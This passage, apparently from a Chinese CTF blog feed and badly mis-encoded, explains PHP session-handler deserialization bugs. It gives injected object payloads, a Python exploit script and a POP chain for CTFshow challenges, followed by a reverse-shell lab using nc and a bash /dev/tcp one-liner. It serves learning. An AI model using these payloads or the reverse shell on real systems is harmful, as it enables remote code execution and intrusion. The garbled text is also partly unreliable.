</code>â€˜|O:11:â€PeopleClassâ€:0:{}â€™&#96;&#96;;</p><p>ä¸Šè¿°çš„$_SESSIONçš„æ•°æ®ä½¿ç”¨php_serializeï¼Œé‚£ä¹ˆæœ€åçš„å­˜å‚¨çš„å†…å®¹å°±æ˜¯<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code>ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬åœ¨è¿›è¡Œè¯»å–çš„æ—¶å€™ï¼Œé€‰æ‹©çš„æ˜¯phpï¼Œé‚£ä¹ˆæœ€åè¯»å–çš„å†…å®¹æ˜¯:</p><p>array<code> </code>(size&#x3D;1)<code> </code>â€˜a:1:{s:6:â€spoockâ€;s:24:â€â€˜<code> </code>&#x3D;&gt; <code> </code>object(__PHP_Incomplete_Class)[1]<code> </code>public<code> </code>â€˜__PHP_Incomplete_Class_Nameâ€™<code> </code>&#x3D;&gt; string &#96;&#96;â€™PeopleClassâ€™<code> </code>(length&#x3D;11)</p><p>è¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œ<strong>phpå¼•æ“ä¼šä»¥|ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦</strong>ï¼Œé‚£ä¹ˆå°±ä¼šå°†<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>ä½œä¸ºSESSIONçš„keyï¼Œå°†<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>ä½œä¸ºvalueï¼Œç„¶åè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åå°±ä¼šå¾—åˆ°PeopleClasè¿™ä¸ªç±»ã€‚ è¿™ç§ç”±äºåºåˆ—è¯åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„ä¸ä¸€æ ·çš„å¼•æ“å°±æ˜¯é€ æˆPHP Sessionåºåˆ—è¯æ¼æ´çš„åŸå› ã€‚</p><p><strong>å®é™…åˆ©ç”¨</strong></p><p>å­˜åœ¨s1.phpå’Œus2.phpï¼Œ2ä¸ªæ–‡ä»¶æ‰€ä½¿ç”¨çš„SESSIONçš„å¼•æ“ï¼ˆsession.serialize_handlerï¼‰ä¸ä¸€æ ·ï¼Œå°±å½¢æˆäº†ä¸€ä¸ªæ¼æ´ã€</p><p>s1.phpï¼Œä½¿ç”¨php_serializeæ¥å¤„ç†session</p><?php ini_set`(`'session.serialize_handler','php_serialize'`);`session_start();$$_SESSION``[``"spoock"``]=`$$_GET`[`"a"``];**us2.php,ä½¿ç”¨phpæ¥å¤„ç†session**ini_set`(`'session.serialize_handler'`,'php'`);session_start();class` `lemon {â€‹    var` `$hi``;`     function` `__construct(){      $this`->hi = `'phpinfo();';`           }``          function` `__destruct() {         `eval`(`$this`->hi);         ` ``}`       `}**å½“è®¿é—®s1.phpæ—¶ï¼Œæäº¤å¦‚ä¸‹çš„æ•°æ®ï¼š**localhost/s1.php?a=|O:5:`"lemon"`:1:{s:2:`"hi"`;s:14:`"echo "`spoock`";"`;}æ­¤æ—¶ä¼ å…¥çš„æ•°æ®ä¼šæŒ‰ç…§php_serializeæ¥è¿›è¡Œåºåˆ—åŒ–ã€‚æ­¤æ—¶è®¿é—®us2.phpæ—¶ï¼Œé¡µé¢è¾“å‡ºï¼ŒspoockæˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„å‡½æ•°ã€‚å› ä¸ºåœ¨è®¿é—®us2.phpæ—¶ï¼Œç¨‹åºä¼šæŒ‰ç…§phpæ¥ååºåˆ—åŒ–SESSIONä¸­çš„æ•°æ®ï¼Œæ­¤æ—¶å°±ä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼Œå°±ä¼šå®ä¾‹åŒ–lemonå¯¹è±¡ï¼Œæœ€åå°±ä¼šæ‰§è¡Œææ„å‡½æ•°ä¸­çš„`eval()`æ–¹æ³•ã€‚ä¾‹é¢˜# **CTFSHOW æ–°ç”Ÿæ¯**### **å‰ªåˆ€çŸ³å¤´å¸ƒ**è€ƒæŸ¥[session](https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020)ååºåˆ—åŒ–æ¼æ´ã€‚ ä¸åŒçš„sessionå¤„ç†å™¨ä¼šå¯¼è‡´[ååºåˆ—åŒ–](https://so.csdn.net/so/search?q=ååºåˆ—åŒ–&spm=1001.2101.3001.7020)æ¼æ´expï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://697e59f6-2b82-43b9-806d-25fa3965a86b.challenge.ctf.show/&quot;</span><br><span class="line">sess=&quot;yu22x&quot;</span><br><span class="line">data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;|O:4:&quot;Game&quot;:1:&#123;s:3:&quot;log&quot;;s:22:&quot;/var/www/html/flag.php&quot;;&#125;&#x27;&#125;</span><br><span class="line">files=&#123;&#x27;file&#x27;:&#x27;1&#x27;&#125;</span><br><span class="line">r = requests.post(url,data=data,files=files,cookies=&#123;&#x27;PHPSESSID&#x27;:&#x27;yu22x&#x27;&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure># **å®‰æ’æ¯ä¸€é“é¢˜**<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_string</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;varr))&#123;   <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;æ–‡ä»¶&quot;</span>.<span class="variable language_">$this</span>-&gt;varr.<span class="string">&quot;å­˜åœ¨&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;è¿™æ˜¯foo1çš„ææ„å‡½æ•°&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;è¿™æ˜¯foo2çš„ææ„å‡½æ•°&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;è¿™æ˜¯foo3çš„ææ„å‡½æ•°&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>index.php<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">åˆ†æå¯ä»¥çŸ¥é“æœ€åè‚¯å®šæ˜¯è¦ç”¨execueé‡Œçš„<span class="keyword">eval</span>çš„</span><br><span class="line"></span><br><span class="line">åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œæ„é€ æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„è‡ªå®šä¹‰å‡½æ•°</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&#x27;echo &quot;spoock&quot;;&#x27;</span>; <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;  <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">foo3</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr</span>; <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  <span class="variable language_">$this</span>-&gt;varr = <span class="keyword">new</span> <span class="title function_ invoke__">foo2</span>();</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo1</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>åœ¨foo1ä¸­çš„æ„é€ å‡½æ•°ä¸­å®šä¹‰$varrçš„å€¼ä¸ºfoo2çš„å®ä¾‹ï¼Œåœ¨foo2ä¸­å®šä¹‰$objä¸ºfoo3çš„å®ä¾‹ï¼Œåœ¨foo3ä¸­å®šä¹‰$varrçš„å€¼ä¸ºecho "spoock"ã€‚æœ€ç»ˆå¾—åˆ°çš„åºåˆ—è¯çš„å€¼æ˜¯$$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}$$]]></content>
      
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå¼¹shellçš„å®éªŒ</title>
      <link href="/2024/07/18/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%AE%9E%E9%AA%8C/"/>
      <url>/2024/07/18/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="åå¼¹shellå®éªŒ"><a href="#åå¼¹shellå®éªŒ" class="headerlink" title="åå¼¹shellå®éªŒ"></a>åå¼¹shellå®éªŒ</h1><p>ä¹‹å‰å›½èµ›ciscn2024åç‰¢</p><p>webé¢˜ç›®ç®€ç›´éš¾å¦‚ç™»å¤©</p><p>ä½†æ˜¯è¿˜æ˜¯æœ‰å¤§ä½¬æŠŠé¢˜ç›®åšå‡ºæ¥äº†ï¼Œè€Œä¸”ç”¨çš„æŠ€æœ¯éå¸¸é«˜ç«¯åå¼¹shell</p><p>ä»Šå¤©ç»ˆäºæŠ½å‡ºæ—¶é—´æ¥åšè¿™ä¸ªåå¼¹shellçš„å®éªŒ</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆè‡ªå·±æ­å»ºä¸€ä¸ªè‡ªå·±çš„æœåŠ¡å™¨ï¼ˆä»¥åè‡ªå·±åšé¢˜ç›®ä¹Ÿå¾—ç”¨ï¼‰è¿™é‡Œæˆ‘ç”¨çš„é˜¿é‡Œäº‘ï¼Œå› ä¸ºå®ƒå¯ä»¥è¯•ç”¨</p><p>ç½‘å€<a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></p><p>è¿™é‡Œåå¼¹shellçš„åŸç†ä¹‹å‰è®²è¿‡äº†ï¼Œè¿™é‡Œå°±ä¸è®²äº†</p><p>æ­å»ºå¥½æœåŠ¡å™¨</p><p>ç¬¬ä¸€æ­¥å…ˆè®¾ç½®æœåŠ¡å™¨ï¼Œè¿™é‡Œéœ€è¦å¼€æ”¾ä¸€ä¸ªç«¯å£ç”¨æ¥åå¼¹shellï¼Œæˆ‘è¿™é‡Œç”¨çš„7777ç«¯å£<img src="/imgs/1.png"></p><p>åç»­æˆ‘ä»¬ä¹Ÿä¼šç”¨è¿™ä¸ªç«¯å£å¤ç°ä¸‹å›½èµ›çš„é¢˜ç›®</p><p>ç„¶åæˆ‘ä»¬ç”¨è‡ªå·±çš„shellæ¥è¿ä¸Šæˆ‘ä»¬çš„æœåŠ¡å™¨</p><p>åˆšè¿ä¸ŠæœåŠ¡å™¨éœ€è¦è‡ªå·±ä¸‹è½½nc</p><p>æˆ‘ä»¬ç”¨è‡ªå·±çš„æœåŠ¡å™¨ä½œä¸ºæ”»å‡»ç«¯</p><p>ç”¨æˆ‘çš„kaliä½œä¸ºè¢«æ”»å‡»ç«¯</p><p>åœ¨æœåŠ¡å™¨ä¸Š</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">7777</span>//ç›‘å¬<span class="number">7777</span>ç«¯å£</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨kaliä¸Š</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">8.xxx</span>.xxx.xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿æ¥ä¸Š</p><p><img src="/imgs/2.png"></p><p>åšè¿™ä¸ªå®éªŒä¹Ÿæ˜¯èŠ±äº†ä¸€äº›æ—¶é—´</p><p>å½“æ—¶æ²¡æƒ³åˆ°æœåŠ¡å™¨è¦è‡ªå·±å»æ‰“å¼€ç«¯å£</p><p>æ²¡å…³ç³»æˆåŠŸäº†å°±è¡Œ</p>]]></content>
      
      
      
        <tags>
            
            <tag> å®éªŒ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
